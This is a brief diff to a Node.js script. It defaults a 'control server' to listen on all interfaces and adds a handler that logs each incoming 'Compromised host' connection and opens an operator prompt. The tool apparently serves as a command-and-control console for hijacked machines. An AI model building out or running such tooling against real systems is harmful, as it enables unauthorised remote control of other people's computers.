@@ -14,8 +14,7 @@ async function main() {
 
     let argv = await yargs(process.argv.slice(2))
         .usage('Usage: $0 [-h ip] [-p port]')
-        .demandOption('host')
-        .string('host')
+        .default('host', '0.0.0.0')
         .alias('host', 'h')
         .default('port', 6997)
         .number('port')
@@ -33,6 +32,11 @@ async function main() {
     });
     await control.listen();
     console.log(`Local control server started at ${argv.host}:${argv.port}`);
+
+    control.on('connection', host => {
+        console.log(`Compromised host ${host.ip} ;)`);
+        rl.prompt();
+    });
 
     const rl = readline.createInterface({
         input: stdin,
